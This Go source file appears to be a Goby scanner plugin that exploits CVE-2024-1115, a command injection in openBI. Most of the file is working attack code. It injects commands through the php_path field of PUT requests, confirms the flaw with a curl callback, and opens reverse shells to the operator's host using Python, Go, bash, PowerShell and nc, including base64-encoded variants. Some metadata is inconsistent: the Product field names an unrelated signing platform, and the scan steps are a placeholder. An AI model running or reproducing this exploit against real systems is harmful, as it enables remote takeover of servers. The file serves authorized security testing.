package exploits

import (
	"encoding/base64"
	"errors"
	"fmt"
	"net/url"
	"strings"
	"time"
	"unicode/utf16"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "openBI /websocket/Setting/set Command Execution Vulnerability (CVE-2024-1115)",
    "Description": "<p>openBI is a big data visualization solution provided by openBI company, designed to help users achieve efficient data analysis and presentation. Versions 1.0.8 and earlier of openBI are vulnerable to an operating system command injection vulnerability. This vulnerability originates from the dlfile function in the /application/websocket/controller/Setting.php file, which fails to properly filter special characters and commands. Attackers can exploit this vulnerability to execute arbitrary system commands, leading to complete system compromise.</p>",
    "Product": "Contract Lock Electronic Signature Platform",
    "Homepage": "https://github.com/openBI-kwc/openBI",
    "DisclosureDate": "2024-08-02",
    "PostTime": "2024-12-26",
    "Author": "2826161446@qq.com",
    "FofaQuery": "body=\"content=\\\"大数据可视化\" && body=\"数维可视化平台\" || body=\"北京格胜科技有限公司\"",
    "GobyQuery": "body=\"content=\\\"大数据可视化\" && body=\"数维可视化平台\" || body=\"北京格胜科技有限公司\"",
    "Level": "2",
    "Impact": "<p>Attackers can exploit this vulnerability to execute arbitrary system commands, leading to complete system compromise, potential data breaches, service disruptions, or other severe consequences.</p>",
    "Recommendation": "<p>1. Follow the vendor's official website for timely updates:<a href=\"https://github.com/openBI-kwc/openBI\">https://github.com/openBI-kwc/openBI</a><a href=\"https://www.qiyuesuo.com/sign\"></a>.2. Use firewalls or other security devices to set access policies and whitelist access.3. Disable public network access to the system unless necessary.</p>",
    "References": [
        "https://www.sxxdckj.com/cms/a/openBI-cao-zuo-xi-tong-ming-ling-zhu-ru-lou-dong.html",
        "https://vuldb.com/?id.252473"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByBashBase64",
            "show": "attackType=reverse"
        },
        {
            "name": "cmd",
            "type": "select",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution",
        "2H1W"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2024-1115"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "openBI /websocket/Setting/set 命令执行漏洞 （CVE-2024-1115）",
            "Product": "openBI",
            "Description": "<p>openBI是openBI公司提供的一款大数据可视化解决方案，旨在帮助用户实现数据的高效分析与展示。openBI 1.0.8及之前版本存在操作系统命令注入漏洞，该漏洞源于/application/websocket/controller/Setting.php文件的dlfile功能未能正确过滤构造命令特殊字符和命令，攻击者可利用该漏洞执行任意系统命令，导致系统被完全控制。</p>",
            "Recommendation": "<p>1. 关注厂商官网，及时关注更新信息：<a href=\"https://github.com/openBI-kwc/openBI\">https://github.com/openBI-kwc/openBI</a>。2. 通过防火墙等安全设备设置访问策略，设置白名单访问。3. 如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可以通过该漏洞执行任意系统命令，导致系统被完全控制，可能造成敏感数据泄露、服务中断或其他严重后果。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "openBI /websocket/Setting/set Command Execution Vulnerability (CVE-2024-1115)",
            "Product": "Contract Lock Electronic Signature Platform",
            "Description": "<p>openBI is a big data visualization solution provided by openBI company, designed to help users achieve efficient data analysis and presentation. Versions 1.0.8 and earlier of openBI are vulnerable to an operating system command injection vulnerability. This vulnerability originates from the dlfile function in the /application/websocket/controller/Setting.php file, which fails to properly filter special characters and commands. Attackers can exploit this vulnerability to execute arbitrary system commands, leading to complete system compromise.</p>",
            "Recommendation": "<p>1. Follow the vendor's official website for timely updates:<a href=\"https://github.com/openBI-kwc/openBI\">https://github.com/openBI-kwc/openBI</a><a href=\"https://www.qiyuesuo.com/sign\"></a>.2. Use firewalls or other security devices to set access policies and whitelist access.3. Disable public network access to the system unless necessary.</p>",
            "Impact": "<p>Attackers can exploit this vulnerability to execute arbitrary system commands, leading to complete system compromise, potential data breaches, service disruptions, or other severe consequences.</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "VariablesOrder": [],
    "EditType": "fast",
    "PocId": "9980"
}`
	// 请注意：在编写POC时，请确认哪一种reverse方式，能够正常反弹Shell，在POC提交审核的时候，只保留能够成功反弹Shell的选项

	//setPayloadRequestHash函数需要再后面增加随机字符串，避免重名
	setPayloadRequestHashFcYbQ3yu := func(hostInfo *httpclient.FixUrl, command string) (ok bool, vulURL string, err error) {
		//请注意：command字段是原始的命令，如果漏洞利用需要对命令进行编码，则需在此处编码
		//请注意：ok值为，true代表命令执行成功，false代表命令执行失败
		//请注意：vulURL 字段为检测后显示的风险路径，示例值为：/path/to/vulable.jsp
		setPutRequest := func(hostInfo *httpclient.FixUrl, url string, payload string, head map[string]string) (*httpclient.HttpResponse, error) {
			putRequest := httpclient.NewRequestConfig("PUT", url)
			putRequest.Timeout = 15
			putRequest.VerifyTls = false
			putRequest.FollowRedirect = false
			putRequest.Data = payload
			for headName, headValue := range head {
				putRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, putRequest)
		}
		defineHeader := map[string]string{
			"Content-Type":    " application/json; charset=UTF-8",
			"Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
			"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
			"Accept":          "application/json, text/plain, */*",
			"Accept-Encoding": "gzip, deflate",
		}
		urlPost := "/websocket/Setting/set"

		postDataByte := fmt.Sprintf("{\"url\":\"ws://192.168.30.189:9090\",\"status\":0,\"php_path\":\";%s\"}", command)
		postDataByte1 := fmt.Sprintf("{\"url\":\"ws://192.168.30.189:9090\",\"status\":1,\"php_path\":\";%s\"}", command)
		var resp1 *httpclient.HttpResponse
		resp1, err = setPutRequest(hostInfo, urlPost, postDataByte, defineHeader)
		if resp1 == nil || resp1.StatusCode != 200 {
			return false, "", errors.New("Fail")
		}
		if err != nil {
			return false, "", err
		}

		var resp *httpclient.HttpResponse
		resp, err = setPutRequest(hostInfo, urlPost, postDataByte1, defineHeader)
		if resp == nil || resp.StatusCode != 200 {
			return false, "", errors.New("Fail")
		}
		if err != nil {
			return false, "", err
		}
		ok = true
		vulURL = "/websocket/Setting/set"
		return ok, vulURL, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//请注意：在此处将setPayloadRequestHash0001函数赋值给runPayload
			runPayload := setPayloadRequestHashFcYbQ3yu

			//请注意：后续代码为模板代码，非特殊情况，无需更改
			//checkStr := goutils.RandomHexString(8)
			//checkUrl, isDomain := godclient.GetGodCheckURL(checkStr)
			checkStr := goutils.RandomHexString(6)
			checkUrl, isDomain := godclient.GetGodCheckURL(checkStr)
			if isDomain {
				checkUrl = "http://" + godclient.GetGodServerIP() + "/U" + strings.Split(checkUrl, ".")[1] + "." + strings.Split(checkUrl, ".")[0]
			}
			pocCommand := "curl " + checkUrl
			//请注意：若漏洞环境特殊，可自行修改为wget、或其他能够出发HTTPLog的命令，由于部分godserver没有域名，所以尽量使用HTTPLog的方式
			//pocCommand := "curl http://" + checkUrl
			//if isDomain {
			//	// pocCommand = "ping -c 1 " + checkUrl
			//	pocCommand = "curl http://" + checkUrl
			//}

			ok, vulUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil || !ok {
				return false
			}
			if godclient.PullExists(checkStr, time.Second*15) {
				ss.VulURL = hostInfo.FixedHostInfo + vulUrl
				return true
			}

			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//请注意：在此处将setPayloadRequestHash0001函数赋值给runPayload
			runPayload := setPayloadRequestHashFcYbQ3yu

			//请注意：后续代码为模板代码，非特殊情况，无需更改
			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				ReverseTcpByPython := func(rp string) string {
					return "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((" + godclient.GetGodServerHost() + "," + rp + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
				}
				ReverseTcpByGo := func(rp string) string {
					return "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"" + godclient.GetGodServerHost() + ":" + rp + "\");cmd:=exec.Command(\"/bin/bash\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
				}
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"ByPython":           ReverseTcpByPython,
					"ByGo":               ReverseTcpByGo,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				ok, _, err := runPayload(expResult.HostInfo, command)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				if !ok {
					expResult.Success = false
					expResult.Output = "RCE FAILED"
				}
				expResult.Success = true
				expResult.Output = "The execution was successful.There is no echo for this vulnerability. Please judge the execution effect by yourself"
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])
				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `Unknown exploitation method`
			}
			return expResult
		},
	))
}
